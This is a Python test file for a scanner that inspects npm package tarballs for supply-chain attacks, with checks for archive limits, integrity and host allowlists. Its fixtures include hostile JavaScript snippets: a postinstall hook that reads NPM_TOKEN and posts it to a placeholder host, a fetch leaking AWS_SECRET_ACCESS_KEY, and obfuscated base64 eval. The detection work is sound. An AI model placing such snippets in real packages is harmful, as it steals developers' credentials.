import asyncio
import base64
import hashlib
import io
import json
import tarfile

import httpx

from app.detection.static_analysis import StaticAnalysisLimits, StaticArtifactInspector
from app.models.schemas import GraphNode, RegistryMetadataResponse, ScanGraph


def archive(files: dict[str, bytes], *, symlink: str | None = None) -> bytes:
    output = io.BytesIO()
    with tarfile.open(fileobj=output, mode="w:gz") as bundle:
        for name, content in files.items():
            info = tarfile.TarInfo(name)
            info.size = len(content)
            bundle.addfile(info, io.BytesIO(content))
        if symlink:
            info = tarfile.TarInfo(symlink)
            info.type = tarfile.SYMTYPE
            info.linkname = "package/index.js"
            bundle.addfile(info)
    return output.getvalue()


def integrity(data: bytes) -> str:
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()


def graph_for(data: bytes, *, expected: str | None = None) -> ScanGraph:
    value = expected or integrity(data)
    node = GraphNode(
        id="sample@1.0.0",
        name="sample",
        version="1.0.0",
        direct=True,
        lockfile_paths=["node_modules/sample"],
        lockfile_integrities=[value],
        registry=RegistryMetadataResponse(
            status="available",
            publisher="owner",
            dist_integrity=value,
            tarball_url="https://registry.npmjs.org/sample/-/sample-1.0.0.tgz",
        ),
    )
    return ScanGraph(scan_id="scan", status="complete", nodes=[node])


def inspector(data: bytes, *, limits: StaticAnalysisLimits | None = None, status: int = 200):
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(status, content=data, request=request)

    return StaticArtifactInspector(
        allowed_hosts={"registry.npmjs.org"},
        limits=limits,
        transport=httpx.MockTransport(handler),
    )


def analyze(data: bytes, *, expected: str | None = None, limits: StaticAnalysisLimits | None = None):
    current = graph_for(data, expected=expected)
    return asyncio.run(
        inspector(data, limits=limits).analyze(
            current,
            candidate_ids={"sample@1.0.0"},
            observed_at=__import__("datetime").datetime.now(__import__("datetime").timezone.utc),
        )
    )


def test_normal_package_and_benign_non_install_process_execution_are_not_flagged():
    normal = archive({"package/index.js": b"module.exports = () => 42;"})
    process = archive({"package/index.js": b"require('child_process').exec('git --version');"})
    assert analyze(normal)[0] == []
    assert analyze(process)[0] == []


def test_correlated_install_time_process_credential_and_network_behavior_is_high_risk():
    data = archive(
        {
            "package/package.json": json.dumps({"scripts": {"postinstall": "node install.js"}}).encode(),
            "package/install.js": (
                b"const cp=require('child_process'); cp.exec('whoami'); "
                b"const token=process.env.NPM_TOKEN; fetch('https://collector.invalid', {body: token});"
            ),
        }
    )
    findings, warnings = analyze(data)
    assert warnings == []
    assert len(findings) == 1
    assert findings[0].rule_id == "suspicious-install-time-behavior"
    assert findings[0].severity == "high"
    value = findings[0].evidence[0].value
    assert value["integrity_verified"] is True
    assert value["file_path"] == "package/install.js"
    assert {item["type"] for item in value["indicators"]} >= {
        "process-execution", "credential-access", "network"
    }


def test_credential_network_and_obfuscated_dynamic_code_are_explainable():
    exfil = archive({"package/a.js": b"fetch('https://x.invalid/' + process.env.AWS_SECRET_ACCESS_KEY);"})
    encoded = b"A" * 260
    obfuscated = archive({"package/b.js": b"eval(Buffer.from('" + encoded + b"','base64').toString())"})
    assert analyze(exfil)[0][0].rule_id == "possible-credential-exfiltration"
    assert analyze(obfuscated)[0][0].rule_id == "obfuscated-dynamic-code"


def test_oversized_and_decompression_limit_archives_are_rejected():
    data = archive({"package/index.js": b"x" * 2_000})
    _, compressed_warnings = analyze(data, limits=StaticAnalysisLimits(max_archive_bytes=10))
    _, expanded_warnings = analyze(data, limits=StaticAnalysisLimits(max_decompressed_bytes=100))
    assert "retrieval failed" in compressed_warnings[0]
    assert "decompressed size limit exceeded" in expanded_warnings[0]


def test_corrupt_traversal_and_symlink_archives_are_rejected_without_extraction():
    corrupt = b"not a tar archive"
    traversal = archive({"../escape.js": b"eval('x')"})
    linked = archive({"package/index.js": b"ok"}, symlink="package/link.js")
    assert "archive was rejected" in analyze(corrupt)[1][0]
    assert "unsafe archive path" in analyze(traversal)[1][0]
    assert "symlink or hardlink" in analyze(linked)[1][0]


def test_integrity_mismatch_is_a_limitation_not_a_finding():
    data = archive({"package/index.js": b"eval('x')"})
    findings, warnings = analyze(data, expected="sha512-" + base64.b64encode(b"wrong").decode())
    assert findings == []
    assert "integrity did not match" in warnings[0]


def test_registry_digest_cannot_mask_a_lockfile_integrity_mismatch():
    data = archive({"package/index.js": b"eval('x')"})
    current = graph_for(data, expected="sha512-" + base64.b64encode(b"wrong").decode())
    current.nodes[0].registry.dist_integrity = integrity(data)
    result = asyncio.run(inspector(data).inspect_node(current.nodes[0]))
    assert result.verified is False
    assert "integrity did not match" in (result.limitation or "")


def test_timeout_registry_failure_and_untrusted_host_fail_closed():
    data = archive({"package/index.js": b"eval('x')"})
    current = graph_for(data)

    def timeout(request: httpx.Request):
        raise httpx.ReadTimeout("timed out", request=request)

    timed = StaticArtifactInspector(
        allowed_hosts={"registry.npmjs.org"}, transport=httpx.MockTransport(timeout)
    )
    result = asyncio.run(timed.inspect_node(current.nodes[0]))
    assert "retrieval failed" in (result.limitation or "")

    unavailable = inspector(b"", status=503)
    result = asyncio.run(unavailable.inspect_node(current.nodes[0]))
    assert "retrieval failed" in (result.limitation or "")

    untrusted_node = current.nodes[0].model_copy(
        update={"registry": current.nodes[0].registry.model_copy(update={"tarball_url": "https://evil.invalid/a.tgz"})}
    )
    result = asyncio.run(inspector(data).inspect_node(untrusted_node))
    assert "allowlist" in (result.limitation or "")
